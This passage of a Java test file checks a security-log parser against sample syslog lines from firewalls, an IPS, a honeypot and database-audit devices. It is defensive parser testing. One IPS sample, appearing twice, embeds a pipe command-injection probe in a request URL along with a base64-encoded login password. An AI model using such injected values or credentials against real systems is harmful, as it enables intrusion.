      String data = "<46>[Violation log] log_time=2022-08-08 10:48:40 +0800; hostname=localhost.localdomain; source_address=192.1.2.91; source_user=--; destination_address=44.238.188.50; destination_port=80; protocol=6; application_id=67; application_attribute_id=0; action=2; rule_name=Default; type=4; ips_rule=--; file_name=--; malware_name=--; host=wrs21.winshipway.com; url=/; wrs_score=21; url_category1=74; url_category2=--; url_category3=--; url_category4=--; source port=56806; direction=0;mail_sender=; mail_recipient=; mail_subject=";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testH3CFirewall() {
    String parserFile = "./resources/parsers/firewall_h3c_F5030-D_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>Aug 12 09:01:07 2022 H3C FW-IRF %%10FILTER/6/FILTER_ZONE_IPV4_EXECUTION: -Chassis=1-Slot=2; SrcZoneName(1025)=Trust;DstZoneName(1035)=Untrust;Type(1067)=ACL;SecurityPolicy(1072)=t-u;RuleID(1078)=1;Protocol(1001)=UDP;Application(1002)=dns;SrcIPAddr(1003)=192.168.254.101;SrcPort(1004)=65192;SrcMacAddr(1021)=0835-71a0-9b6f;DstIPAddr(1007)=223.5.5.5;DstPort(1008)=53;MatchCount(1069)=1;Event(1048)=Permit;";
     /* parse(botuEngine, data);
      data = "<190>Aug 18 18:54:49 2022 ZJLSH-MS-IDC1-F5010-01 %%10FILTER/6/FILTER_ZONE_IPV4_EXECUTION: SrcZoneName(1025)=Untrust_3;DstZoneName(1035)=Trust_4;Type(1067)=ACL;SecurityPolicy(1072)=ºÚÃûµ¥ÑÝÁ·;RuleID(1078)=11;Protocol(1001)=TCP;Application(1002)=general_tcp;SrcIPAddr(1003)=172.28.47.51;SrcPort(1004)=51802;SrcMacAddr(1021)=74ea-c8ca-4003;DstIPAddr(1007)=10.53.150.117;DstPort(1008)=2021;MatchCount(1069)=2;Event(1048)=Deny;";
      parse(botuEngine, data);
      data = "<188>Aug 20 10:08:17 2022 ZJLSH-MS-IDC1-F5010-01 %%10DPI/4/DAC_STORE_STATE_FULL: The storage space-based alarm threshold (AlarmThreshold(1121)=20%) set for StoreName(1119)=TRAFFIC was exceeded.";
      parse(botuEngine, data);
      data = "<190>Aug 20 07:54:31 2022 ZJLSH-MS-IDC1-F5010-01 %%10SHELL/6/SHELL_CMD: -Line=vty0-IPAddr=10.100.1.51-User=admin; Command is delete /unreserved iccstartup.cfg";
      parse(botuEngine, data);
      data = "<190>Aug 20 07:52:52 2022 ZJLSH-MS-IDC1-F5010-01 %%10SSHS/6/SSHS_LOG: Accepted password for admin from 10.100.1.51 port 52427.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%10CFGMAN/5/CFGMAN_OPTCOMPLETION: -OperateType=running2net-OperateTime=6101-OperateState=FileTransferError-OperateEndTime=3104564279; Operation completed.";
      parse(botuEngine, data);
      data = "<190>Aug 18 18:54:46 2022 ZJLSH-MS-IDC1-F5010-01 %%10FILTER/6/FILTER_ZONE_IPV4_EXECUTION: SrcZoneName(1025)=Untrust_3;DstZoneName(1035)=Trust_4;Type(1067)=ACL;SecurityPolicy(1072)=..........;RuleID(1078)=11;Protocol(1001)=TCP;Application(1002)=general_tcp;SrcIPAddr(1003)=172.28.47.51;SrcPort(1004)=51830;SrcMacAddr(1021)=74ea-c8ca-4003;DstIPAddr(1007)=10.53.150.117;DstPort(1008)=2021;MatchCount(1069)=1;Event(1048)=Deny;";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%FILTER/6/FILTER_EXECUTION_ICMP:RcvIfName(1023)=GigabitEthernet2/0/2;Direction(1070)=inbound;Type(1067)=IPv4;Acl(1068)=3000;RuleID(1078)=0;Protocol(1001)=ICMP;SrcIPAddr(1003)=100.1.1.1;DstIPAddr(1007)=200.1.1.1;IcmpType(1062)=Echo(8);IcmpCode(1063)=0;MatchCount(1069)=1000;Event(1048)=Permit;";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%ATK/3/ATK_ICMP_FLOOD:RcvIfName(1023)=GigabitEthernet0/0/2;DstIPAddr(1007)=6.1.1.5;RcvVPNInstance(1042)=;UpperLimit(1049)=10;Action(1053)=logging;BeginTime_c(1011)=20131009093351.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%ANTI-VIR/4/ANTIVIRUS_IPV4_INTERZONE:-Context=1; Protocol(1001)=TCP;Application(1002)=http; SrcIPAddr(1003)=100.10.10.40; SrcPort(1004)=56690;DstIPAddr(1007)=200.10.10.40; DstPort(1008)=80; RcvVPNInstance(1042)=;SrcZoneName(1025)=spf; DstZoneName(1035)=spf; UserName(1113)=abc;PolicyName(1079)=av; VirusName(1085)=MODIFIED-EICAR-Test-File;VirusID(1086)=95; VirusCategory(1182)=Worm; Severity(1087)=MEDIUM;MD5(1129)=d41d8cd98f00b204e9800998ecf8427e; Action(1053)=Reset & Logging;HitDirection(1115)=original; RealSrcIP(1100)=10.10.10.10,20.20.20.20;FileName(1097)=123.pptx; FileType(1096)=pptx; SrcMacAddr(1021)= 021a-c501-0001;DstMacAddr(1022)=741f-4a93-02ac; RealSrcMacAddr(1204)=;RealDstMacAddr(1205)=; VlanID(1175)=400;VNI(1213)=--;SrcLocation(1209)=China Macao;DstLocation(1214)=SaintKittsandNevis;";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%ANTI-VIR/4/ANTIVIRUS_IPV6_INTERZONE:-Context=1; Protocol(1001)=TCP;Application(1002)=http; SrcIPv6Addr(1036)=100::40; SrcPort(1004)=56690;DstIPv6Addr(1037)=200::40; DstPort(1008)=80; RcvVPNInstance(1042)=;SrcZoneName(1025)=spf; DstZoneName(1035)=spf; UserName(1113)=aaa;PolicyName(1079)=av; VirusName(1085)=MODIFIED-EICAR-Test-File;VirusID(1086)=95; VirusCategory(1182)=Worm; Severity(1087)=MEDIUM;MD5(1129)=d41d8cd98f00b204e9800998ecf8427e; Action(1053)=Reset & Logging;HitDirection(1115)=original; RealSrcIP(1100)=10::1; FileName(1097)=123.pptx;FileType(1096)=pptx; SrcMacAddr(1021)=[STRING]; DstMacAddr(1022)=[STRING];RealSrcMacAddr(1204)=[STRING];RealDstMacAddr(1205)=[STRING];VlanID(1175)=400;VNI(1213)=--;SrcLocation(1209)=China Macao;DstLocation(1214)=SaintKittsandNevis;";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%ANTI-VIR/4/ANTIVIRUS_WARNING: -Context=1; Rolled back the antivirus signature library successfully.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%BLS/5/BLS_ENTRY_ADD: -Context=1; SrcIPAddr(1003)=9.1.1.5;DSLiteTunnelPeer(1040)=--; RcvVPNInstance(1041)=vpn1; TTL(1051)=10;Reason(1052)=Scan behavior detected.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%BLS/3/BLS_USER_IP_BLOCK:User(1098)=user1;SrcIPAddr(1003)=1.1.1.6;DomainName(1099)=;RcvVPNInstance(1042)=;SrcMacAddr(1021)=38ad-bea7-829a;VlanID(1175)=10;VNI(1213)=--.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%SCD/6/SCD_IPV4:-Context=1;Protocol(1001)=TCP;ServerIPAddr(1003)=192.168.105.1;DstIPAddr(1007)=192.168.105.111;DstPort(1008)=80; Illegal server connection.";
      parse(botuEngine, data);
      data = "<189>Aug 20 07:50:11 2022 ZJLSH-MS-IDC1-F5010-01 %%IPS/4/IPS_IPV6_INTERZONE:-Context=1; Protocol(1001)=TCP;Application(1002)=http; SrcIPv6Addr(1036)=100::40; SrcPort(1004)=2999;DstIPv6Addr(1037)=200::40; DstPort(1008)=80; RcvVPNInstance(1042)=;SrcZoneName(1025)=spf; DstZoneName(1035)=spf; UserName(1113)=aaa;PolicyName(1079)=ips;AttackName(1088)=WEB_CLIENT_Windows_Media_ASF_File_Download_SET;AttackID(1089)=5707; Category(1090)=Other; Protection(1091)=Other;SubProtection(1092)=Other; Severity(1087)=CRITICAL; Action(1053)=Reset & Logging;CVE(1075)=CVE-2014-6277 | CVE-2014-6278; BID(1076)=BID-22559;MSB(1077)=MS10-017; HitDirection(1115)=reply; RealSrcIP(1100)=10::1;SubCategory(1124)=Other; LoginUserName(1177)=admin;LoginPwd(1178)=YW5nc2MxMDA2Vw==;CapturePktName(1116)=ips_100::40_20171205_101112_5707.pcap;HttpHost(1117)=www.shr.com;HttpFirstLine(1118)=/file/show.cgi%7cecho%20HSC/http_pic_300k.jpg;FileName(1097)=123.txt; SrcMacAddr(1021)= 021a-c501-0001;DstMacAddr(1022)=741f-4a93-02ac; RealSrcMacAddr(1204)=;RealDstMacAddr(1205)=;PayLoad(1135)=/file/show.cgi;VlanID(1175)=400;VNI(1213)=--;SrcLocation(1209)=China Macao;DstLocation(1214)=SaintKittsandNevis;";
      parse(botuEngine, data);*/
      data = "<134> Nov 14 02:00:00 2020 H3C %%10IPS/4/IPS_IPV6_INTERZONE:-Context=1; Protocol(1001)=TCP; Application(1002)=http; SrcIPAddr(1003)=100.10.10.40; SrcPort(1004)=2999; DstIPAddr(1007)=200.10.10.40; DstPort(1008)=80; RcvVPNInstance(1042)=; SrcZoneName(1025)=spf; DstZoneName(1035)=spf; UserName(1113)=abc; PolicyName(1079)=ips; AttackName(1088)=WEB_CLIENT_Windows_Media_ASF_File_Download_SET; AttackID(1089)=5707; Category(1090)=Other; Protection(1091)=Other; SubProtection(1092)=Other; Severity(1087)=CRITICAL; Action(1053)=Reset & Logging; CVE(1075)=CVE-2014-6277 | CVE-2014-6278; BID(1076)=BID-22559; MSB(1077)=MS10-017; HitDirection(1115)=original; RealSrcIP(1100)=10.10.10.10,20.20.20.20; SubCategory(1124)=Other; LoginUserName(1177)=admin; LoginPwd(1178)=YW5nc2MxMDA2Vw==; CapturePktName(1116)=ips_100.10.10.40_20171205_101112_5707.pcap; HttpHost(1117)=www.shr.com; HttpFirstLine(1118)=/file/show.cgi%7cecho%20HSC/http_pic_300k.jpg; FileName(1097)=123.txt; SrcMacAddr(1021)= 021a-c501-0001; DstMacAddr(1022)=741f-4a93-02ac; RealSrcMacAddr(1204)=; RealDstMacAddr(1205)=; PayLoad(1135)=/file/show.cgi;VlanID(1175)=400;VNI(1213)=--;SrcLocation(1209)=China Macao;DstLocation(1214)=SaintKittsandNevis;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testHoneypot() {
    String parserFile = "./resources/parsers/honeypot_webray_raytrap_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<133>Aug 13 07:27:24 RayTRAP/192.168.254.81 {\"action\":\"Connect\",\"data.package\":\"1MOyoQIABAAAAAAAAAAAAP//AAABAAAAwlH3YiWsDgA+AAAAPgAAAHSOCAA2gFQr3gigAQgARQAAMP//QAB/Boy4rBMEAsCo/lFulAG7CaIW5gAAAABwAvrwiEcAAAIEBbQBAQQC\",\"dataId\":\"63731f2d44215f0d8f08511278f8433d\",\"desc\":\"172.19.4.2:28308 连接 192.168.254.81:443\",\"destId\":\"Jqojfxhw9xiKdj9TZMFbX6\",\"destIp\":\"192.168.254.81\",\"destIpLoc\":\"cn|本地\",\"destPort\":\"443\",\"evtlogId\":\"c4HQVj7gtuuoju8WsccGyX\",\"level\":\"4\",\"module\":\"log.TCP\",\"result\":\"0\",\"serialId\":\"172.19.4.2\",\"srcIp\":\"172.19.4.2\",\"srcIpLoc\":\"|局域网\",\"srcPort\":\"28308\",\"time\":\"2022-08-13 15:27:21+08:00\",\"type\":\"log.network\"}";
      parse(botuEngine, data);
      data = "<133>Aug 13 08:56:41 RayTRAP/192.168.254.81 {\"cfdc\":\"60\",\"count\":\"1\",\"desc\":\"172.19.4.2:12617 连接 192.168.254.81:3389\",\"destId\":\"Jqojfxhw9xiKdj9TZMFbX6\",\"destIp\":\"192.168.254.81\",\"destIpLoc\":\"cn|本地\",\"etime\":\"2022-08-13 16:56:41+08:00\",\"eventId\":\"p3ZVLvsLYuJTEsQQSzAtqS\",\"kind\":\"\",\"label\":\"log.TCP Connect\",\"level\":\"3\",\"logData\":\"{\\\"action\\\":\\\"Connect\\\",\\\"data.package\\\":\\\"1MOyoQIABAAAAAAAAAAAAP//AAABAAAARmf3YkrPBwA+AAAAPgAAAHSOCAA2gFQr3gigAQgARQAAMP//QAB/Boy4rBMEAsCo/lExSQ0905ByLQAAAABwAvrwlNoAAAIEBbQBAQQC\\\",\\\"data.payload\\\":\\\"AwAALyrgAAAAAABDb29raWU6IG1zdHNoYXNoPWFkbWluaXN0cg0KAQAIAAEAAAAWAwMAlAEAAJADA2L3Z08gNpC6ufofC4XQNMalLRlCl0wa3NXzDpRVRcjaAAAqwCzAK8AwwC8AnwCewCTAI8AowCfACsAJwBTAEwCdAJwAPQA8ADUALwAKAQAAPQAKAAgABgAdABcAGAALAAIBAAANABoAGAgECAUIBgQBBQECAQQDBQMCAwICBgEGAwAjAAAAFwAA/wEAAQAWAwEBBhAAAQIBAH/CUmTA7wECcuFI2C0901pqn2wyxh4HfIvU36NDkOLy2dT7T4T2xSMLMX9gRL15cZZxHePhL2p1BeG6CCe5aIuceyPV4+jg+VVbr78pp6QaXQdswlShUfdhP3t43ibtjIiPH1kS52gcHsXicQ+jE/SkJwZQ5Zvo7Adlk6LgsDWO+9B5/K0jfSM2bH9ng8izisWwaGtlKzx6KCTyUuz9zI35jDNciDhQhDwBlgH2miKgUWExLhBTgpSK/90szk46L6NNUzWPjSS3YoZlYfaOaWeHi+AZP8LeplT7UykjCM9vivsxPNSO33Nz5IMtrBBx1czfp5ePiSXpkRZVU8JZaKYUAwEAAQEWAwEAMHUmud4dP+Mo0/bx7LKejwU9gVv4oJQwEBz2HNFc/0It+CQgT9NnDcCN1JylygSHag==\\\",\\\"dataId\\\":\\\"80a4efa6ac32de4580173bf4990fdc38\\\",\\\"desc\\\":\\\"172.19.4.2:12617 连接 192.168.254.81:3389\\\",\\\"destId\\\":\\\"Jqojfxhw9xiKdj9TZMFbX6\\\",\\\"destIp\\\":\\\"192.168.254.81\\\",\\\"destIpLoc\\\":\\\"cn|本地\\\",\\\"destPort\\\":\\\"3389\\\",\\\"evtlogId\\\":\\\"QGqQbJMwpXDesTF5otRwFE\\\",\\\"level\\\":\\\"4\\\",\\\"module\\\":\\\"log.TCP\\\",\\\"result\\\":\\\"0\\\",\\\"serialId\\\":\\\"172.19.4.2\\\",\\\"srcIp\\\":\\\"172.19.4.2\\\",\\\"srcIpLoc\\\":\\\"|局域网\\\",\\\"srcPort\\\":\\\"12617\\\",\\\"time\\\":\\\"2022-08-13 16:56:38+08:00\\\",\\\"type\\\":\\\"log.network\\\"}\",\"module\":\"log.TCP\",\"name\":\"log.TCP诱捕到Connect事件\",\"ruleId\":\"10003\",\"source\":\"TTP.linux\",\"srcId\":\"\",\"srcIp\":\"172.19.4.2\",\"srcIpLoc\":\"|局域网\",\"stage\":\"2\",\"status\":\"1\",\"stime\":\"2022-08-13 16:56:41+08:00\",\"type\":\"log.network\"}";
      parse(botuEngine, data);
      data = "<133>Aug 13 08:47:00 RayTRAP/192.168.254.81 {\"cfdc\":\"60\",\"count\":\"1\",\"desc\":\"用户登录(, )\",\"destId\":\"ddq3zfrFALPY3wRLVfeeYL\",\"destIp\":\"192.168.169.199\",\"destIpLoc\":\"cn|本地\",\"etime\":\"2022-08-13 16:47:00+08:00\",\"eventId\":\"coAwtWhcZZEJQezKNLt6DR\",\"kind\":\"\",\"label\":\"telnet Login\",\"level\":\"3\",\"logData\":\"{\\\"action\\\":\\\"Login\\\",\\\"desc\\\":\\\"用户登录(, )\\\",\\\"destId\\\":\\\"ddq3zfrFALPY3wRLVfeeYL\\\",\\\"destIp\\\":\\\"192.168.169.199\\\",\\\"destIpLoc\\\":\\\"cn|本地\\\",\\\"destPort\\\":\\\"27\\\",\\\"evtlogId\\\":\\\"iL3CkYc5C3mkJgh7e9LNXX\\\",\\\"level\\\":\\\"5\\\",\\\"module\\\":\\\"telnet\\\",\\\"result\\\":\\\"1\\\",\\\"serialId\\\":\\\"48UtA6ztNgWKtVzmc2nVTG\\\",\\\"srcIp\\\":\\\"172.19.4.2\\\",\\\"srcIpLoc\\\":\\\"|局域网\\\",\\\"srcPort\\\":\\\"11855\\\",\\\"time\\\":\\\"2022-08-13 16:46:40+08:00\\\",\\\"type\\\":\\\"svc\\\"}\",\"module\":\"telnet\",\"name\":\"telnet诱捕到Login事件\",\"ruleId\":\"10003\",\"source\":\"DCP.windows\",\"srcId\":\"\",\"srcIp\":\"172.19.4.2\",\"srcIpLoc\":\"|局域网\",\"stage\":\"2\",\"status\":\"0\",\"stime\":\"2022-08-13 16:47:00+08:00\",\"type\":\"svc\"}";
      parse(botuEngine, data);
      data = "<133>Aug 13 09:34:45 RayTRAP/192.168.254.81 {\"action\":\"GET\",\"desc\":\"访问首页：/\",\"destId\":\"Jqojfxhw9xiKdj9TZMFbX6\",\"destIp\":\"192.168.254.81\",\"destIpLoc\":\"cn|本地\",\"destPort\":\"443\",\"evtlogId\":\"Dhv4QcPsmUTjcaoK6SmmWD\",\"level\":\"4\",\"module\":\"YW\",\"result\":\"0\",\"srcIp\":\"172.19.4.2\",\"srcIpLoc\":\"|局域网\",\"srcPort\":\"15053\",\"time\":\"2022-08-13 17:34:42+08:00\",\"type\":\"web\",\"url\":\"/\"}";
      parse(botuEngine, data);
      data = "<133>Aug 13 08:56:41 RayTRAP/192.168.254.81 {\"cfdc\":\"60\",\"count\":\"1\",\"desc\":\"172.19.4.2:12617 连接 192.168.254.81:3389\",\"destId\":\"Jqojfxhw9xiKdj9TZMFbX6\",\"destIp\":\"192.168.254.81\",\"destIpLoc\":\"cn|本地\",\"etime\":\"2022-08-13 16:56:41+08:00\",\"eventId\":\"p3ZVLvsLYuJTEsQQSzAtqS\",\"kind\":\"\",\"label\":\"log.TCP Connect\",\"level\":\"3\",\"logData\":\"{\\\"action\\\":\\\"Connect\\\",\\\"data.package\\\":\\\"1MOyoQIABAAAAAAAAAAAAP//AAABAAAARmf3YkrPBwA+AAAAPgAAAHSOCAA2gFQr3gigAQgARQAAMP//QAB/Boy4rBMEAsCo/lExSQ0905ByLQAAAABwAvrwlNoAAAIEBbQBAQQC\\\",\\\"data.payload\\\":\\\"AwAALyrgAAAAAABDb29raWU6IG1zdHNoYXNoPWFkbWluaXN0cg0KAQAIAAEAAAAWAwMAlAEAAJADA2L3Z08gNpC6ufofC4XQNMalLRlCl0wa3NXzDpRVRcjaAAAqwCzAK8AwwC8AnwCewCTAI8AowCfACsAJwBTAEwCdAJwAPQA8ADUALwAKAQAAPQAKAAgABgAdABcAGAALAAIBAAANABoAGAgECAUIBgQBBQECAQQDBQMCAwICBgEGAwAjAAAAFwAA/wEAAQAWAwEBBhAAAQIBAH/CUmTA7wECcuFI2C0901pqn2wyxh4HfIvU36NDkOLy2dT7T4T2xSMLMX9gRL15cZZxHePhL2p1BeG6CCe5aIuceyPV4+jg+VVbr78pp6QaXQdswlShUfdhP3t43ibtjIiPH1kS52gcHsXicQ+jE/SkJwZQ5Zvo7Adlk6LgsDWO+9B5/K0jfSM2bH9ng8izisWwaGtlKzx6KCTyUuz9zI35jDNciDhQhDwBlgH2miKgUWExLhBTgpSK/90szk46L6NNUzWPjSS3YoZlYfaOaWeHi+AZP8LeplT7UykjCM9vivsxPNSO33Nz5IMtrBBx1czfp5ePiSXpkRZVU8JZaKYUAwEAAQEWAwEAMHUmud4dP+Mo0/bx7LKejwU9gVv4oJQwEBz2HNFc/0It+CQgT9NnDcCN1JylygSHag==\\\",\\\"dataId\\\":\\\"80a4efa6ac32de4580173bf4990fdc38\\\",\\\"desc\\\":\\\"172.19.4.2:12617 连接 192.168.254.81:3389\\\",\\\"destId\\\":\\\"Jqojfxhw9xiKdj9TZMFbX6\\\",\\\"destIp\\\":\\\"192.168.254.81\\\",\\\"destIpLoc\\\":\\\"cn|本地\\\",\\\"destPort\\\":\\\"3389\\\",\\\"evtlogId\\\":\\\"QGqQbJMwpXDesTF5otRwFE\\\",\\\"level\\\":\\\"4\\\",\\\"module\\\":\\\"log.TCP\\\",\\\"result\\\":\\\"0\\\",\\\"serialId\\\":\\\"172.19.4.2\\\",\\\"srcIp\\\":\\\"172.19.4.2\\\",\\\"srcIpLoc\\\":\\\"|局域网\\\",\\\"srcPort\\\":\\\"12617\\\",\\\"time\\\":\\\"2022-08-13 16:56:38+08:00\\\",\\\"type\\\":\\\"log.network\\\"}\",\"module\":\"log.TCP\",\"name\":\"log.TCP诱捕到Connect事件\",\"ruleId\":\"10003\",\"source\":\"TTP.linux\",\"srcId\":\"\",\"srcIp\":\"172.19.4.2\",\"srcIpLoc\":\"|局域网\",\"stage\":\"2\",\"status\":\"1\",\"stime\":\"2022-08-13 16:56:41+08:00\",\"type\":\"log.network\"}";
      parse(botuEngine, data);
      data = "<133>Aug 16 10:55:08 RayTRAP/192.168.254.81 {\"cfdc\":\"60\",\"count\":\"1\",\"desc\":\"访问首页：/\",\"destId\":\"Jqojfxhw9xiKdj9TZMFbX6\",\"destIp\":\"192.168.254.81\",\"destIpLoc\":\"cn|本地\",\"etime\":\"2022-08-16 18:55:08+08:00\",\"eventId\":\"V9QM4CfBxNKYKPyZzNjD7Z\",\"kind\":\"\",\"label\":\"WEB1 GET\",\"level\":\"3\",\"logData\":\"{\\\"action\\\":\\\"GET\\\",\\\"desc\\\":\\\"访问首页：/\\\",\\\"destId\\\":\\\"Jqojfxhw9xiKdj9TZMFbX6\\\",\\\"destIp\\\":\\\"192.168.254.81\\\",\\\"destIpLoc\\\":\\\"cn|本地\\\",\\\"destPort\\\":\\\"8080\\\",\\\"evtlogId\\\":\\\"5KCuRi9if7XbWqYKwymz4h\\\",\\\"level\\\":\\\"4\\\",\\\"module\\\":\\\"WEB1\\\",\\\"result\\\":\\\"0\\\",\\\"srcIp\\\":\\\"172.19.4.26\\\",\\\"srcIpLoc\\\":\\\"|局域网\\\",\\\"srcPort\\\":\\\"52818\\\",\\\"time\\\":\\\"2022-08-16 18:55:05+08:00\\\",\\\"type\\\":\\\"WEB访问\\\"}\",\"module\":\"WEB1\",\"name\":\"WEB1诱捕到GET事件\",\"ruleId\":\"10003\",\"source\":\"TTP.linux\",\"srcId\":\"\",\"srcIp\":\"172.19.4.26\",\"srcIpLoc\":\"|局域网\",\"stage\":\"2\",\"status\":\"0\",\"stime\":\"2022-08-16 18:55:08+08:00\",\"type\":\"WEB访问\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallDPtechFW1000() {
    String parserFile = "./resources/parsers/firewall_dptech_fw1000-ga-x_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>2022-08-09 15:26:43 ZJLSH-ZWY-CB-5F-F1000-hlw-01 %%--FW/WEB/6/OPERLOG(l): client-type(84):web;user-name(85):admin;host-ip(86):10.100.55.254;error-code(87):0;用户 [ admin ] (IP 地址: 10.100.55.254) 超时退出。 result: Success.";
      parse(botuEngine, data);
      data = "<14>Jul  5 13:26:44 2009 DPTECH %%UAG/ATTACK/0/DATALOG(l): log-type(1):attack-protect;event(2):block;attack-name(11):(352325536)死亡之Ping;protocol-name(17):(50333952)IP;ip-proto-id(18):1;source-ip(24):192.168.1.154;source-port(25):0;destination-ip(26):192.168.1.254;destination-port(27):0;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/2;ifname-outside(30):eth0/2;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
      data = "<14>Jul  5 13:22:53 2009 DPTECH %%UAG/AV/3/DATALOG(l): log-type(1):av-protect;event(2):block;av-name(15):(488647691)Net-Worm.Win32.Nimda.ef;protocol-name(17):(84021124)FTP Data;ip-proto-id(18):6;source-ip(24):1.1.1.2;source-port(25):1530;destination-ip(26):2.2.2.2;destination-port(27):2247;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/1;ifname-outside(30):unknown;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
      data = "<14>Jul  5 13:22:53 2009 DPTECH %%UAG/AV/3/DATALOG(l): log-type(1):av-protect;event(2):block;av-name(15):(488647691)Net-Worm.Win32.Nimda.ef;protocol-name(17):(84021124)FTP Data;ip-proto-id(18):6;source-ip(24):1.1.1.2;source-port(25):1530;destination-ip(26):2.2.2.2;destination-port(27):2247;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/1;ifname-outside(30):unknown;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
      data = "<12>2011-03-09 20:55:39 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The use of cpu is too high: 17.";
      parse(botuEngine, data);
      data = "Jul  5 13:26:44 2009 DPTECH %%UAG/ATTACK/0/DATALOG(l): log-type(1):attack-protect;event(2):block;attack-name(11):(352325536)死亡之Ping;protocol-name(17):(50333952)IP;ip-proto-id(18):1;source-ip(24):192.168.1.154;source-port(25):0;destination-ip(26):192.168.1.254;destination-port(27):0;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/2;ifname-outside(30):eth0/2;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
      data = "<11>2000-01-06 01:35:17 DPTECH %%--IPS/WEB/3/OPERLOG(l):client-type(84):web;user-name(85):admin;host-ip(86):10.11.100.75;error-code(87):0;User [admin] logged in from IP address: [10.11.100.75].";
      parse(botuEngine, data);
      data = "Jul  5 13:22:53 2009 DPTECH %%UAG/AV/3/DATALOG(l): log-type(1):av-protect;event(2):block;av-name(15):(488647691)Net-Worm.Win32.Nimda.ef;protocol-name(17):(84021124)FTP Data;ip-proto-id(18):6;source-ip(24):1.1.1.2;source-port(25):1530;destination-ip(26):2.2.2.2;destination-port(27):2247;block-reason(28):ABNORMITY-DETECTION;ifname-inside(29):eth0/1;ifname-outside(30):unknown;summary-count(33):1;summary-offset(34):0;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDBAuditSangforDAS() {
    String parserFile = "./resources/parsers/dbaudit_sangfor_das_syslog.bo.x";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<157>Aug 11 16:36:18 localhost load_db[1392]: \"record_id:189275\",\"dev:86D7CEB8\",\"date:20220702\",\"log_type:db_audit\",\"src_ip:192.168.169.199\",\"src_port:55512\",\"dst_ip:192.168.169.199\",\"dst_port:1433\",\"record_time:17:56:51\",\"ret_id:0\",\"db_usr:\",\"aff_rows:0\",\"sql:SELECT * FROM KQ_DealCommand WHERE ComType=1 AND Flag<>2 ORDER BY MakeDate,ComValue\"";
      parse(botuEngine, data);
      data = "<157>11-06-2019 16:28:15 Local3.Notice 10.66.64.158 Nov 6 16:31:05 localhost load_db[9073]: \"record_id:2\",\"dev:14EE9470\",\"date:20191106\",\"log_type:db_audit\",\"src_ip:200.200.66.19\",\"src_port:23057\",\"dst_ip:200.200.64.19\",\"dst_port:3306\",\"record_time:16:25:31\",\"ret_id:0\",\"db_usr:root\",\"db_name:\",\"db_type:Mysql\",\"table_name:\",\"operate:NONE\",\"data_base_manage:\",\"aff_rows:0\",\"sql:SET NAMES utf8\"";
      parse(botuEngine, data);
      data = "<157>11-06-2019 16:28:15 Local3.Notice 10.66.64.158 Nov 6 16:31:05 localhost load_db[9073]: \"record_id:9\",\"dev:14EE9470\",\"date:20191106\",\"log_type:risk_db_audit\",\"src_ip:200.200.66.19\",\"src_port:23058\",\"dst_ip:200.200.64.19\",\"dst_port:3306\",\"record_time:16:25:31\",\"ret_id:0\",\"db_usr:root\",\"db_name:\",\"db_type:Mysql\",\"table_name:\",\"operate:NONE\",\"data_base_manage:\",\"aff_rows:0\",\"r_cnt:1\",\"r_type0:高权存储过程\",\"r_rule0:高权存储过程\",\"r_pri0:high risk\",\"sql:SHOW PROCEDURE STATUS WHERE Db='discuz'\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDBAuditNsFocus() {
    String parserFile = "./resources/parsers/dbaudit_nsfocus_dasnx3[v5.6r18]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
